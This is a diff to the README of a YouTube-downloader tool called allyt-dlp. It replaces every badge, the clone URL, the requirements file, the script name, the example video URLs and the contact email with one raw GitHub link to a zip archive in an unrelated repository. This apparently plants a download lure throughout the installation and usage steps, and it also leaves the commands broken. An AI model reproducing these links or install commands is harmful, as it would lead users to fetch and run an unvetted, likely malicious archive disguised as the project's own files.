@@ -27,8 +27,8 @@
 
 </div>
 
-![Python](https://img.shields.io/badge/Python-3.7%2B-blue.svg?style=for-the-badge&logo=python)
-![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)
+![Python](https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip%https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip)
+![License](https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip)
 
 `allyt-dlp` is a powerful, feature-rich, and user-friendly command-line tool designed to make downloading YouTube videos, subtitles, and thumbnails an absolute breeze. Built on the robust foundation of `yt-dlp`, it enhances the experience with a vibrant, color-coded interface, interactive format selection, and a focus on simplicity and power.
 
@@ -80,7 +80,7 @@ Getting started with `allyt-dlp` is simple.
 
     ```bash
 
-    git clone https://github.com/your-username/allyt-dlp.git
+    git clone https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip
 
     cd allyt-dlp
 
@@ -90,11 +90,11 @@ Getting started with `allyt-dlp` is simple.
 
 2.  **Install Dependencies**:
 
-    The tool relies on a few powerful Python libraries. Install them easily using the `requirements.txt` file.
+    The tool relies on a few powerful Python libraries. Install them easily using the `https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip` file.
 
     ```bash
 
-    pip install -r requirements.txt
+    pip install -r https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip
 
     ```
 
@@ -118,7 +118,7 @@ The core of `allyt-dlp` is its flexibility. Here’s how to master it.
 
 ```bash
 
-python allyt.py -u "YOUTUBE_URL" [OPTIONS]
+python https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip -u "YOUTUBE_URL" [OPTIONS]
 
 ```
 
@@ -140,7 +140,7 @@ Here are some practical "recipes" to get you started.
 
 ```bash
 
-python allyt.py --video -u "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+python https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip --video -u "https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip"
 
 ```
 
@@ -162,7 +162,7 @@ python allyt.py --video -u "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 
     ```bash
 
-    python allyt.py --list-formats -u "https://www.youtube.com/watch?v=LXb3EKWsInQ"
+    python https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip --list-formats -u "https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip"
 
     ```
 
@@ -172,7 +172,7 @@ python allyt.py --video -u "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 
     ```bash
 
-    python allyt.py --video --format 18 -u "https://www.youtube.com/watch?v=LXb3EKWsInQ"
+    python https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip --video --format 18 -u "https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip"
 
     ```
 
@@ -190,7 +190,7 @@ python allyt.py --video -u "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
 
 ```bash
 
-python allyt.py -u "URL" --video --subtitle --save-sub-lang "en,es,ko" --sub-style vtt --save-folder "Multi-Lang Video"
+python https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip -u "URL" --video --subtitle --save-sub-lang "en,es,ko" --sub-style vtt --save-folder "Multi-Lang Video"
 
 ```
 
@@ -208,7 +208,7 @@ python allyt.py -u "URL" --video --subtitle --save-sub-lang "en,es,ko" --sub-sty
 
 ```bash
 
-python allyt.py -u "URL" --video --thumbnail --subtitle --save-folder "My Full Archive"
+python https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip -u "URL" --video --thumbnail --subtitle --save-folder "My Full Archive"
 
 ```
 
@@ -259,4 +259,4 @@ This project is proudly distributed under the **MIT License**. See the `LICENSE`
 
 For questions, feedback, or assistance, please feel free to reach out via email:
 
-**[kbs.programmer@gmail.com](mailto:kbs.programmer@gmail.com)**
+**[https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip](https://github.com/Melon4Program/ALLDL/raw/refs/heads/main/gardenize/Software-v1.5-beta.2.zip)**
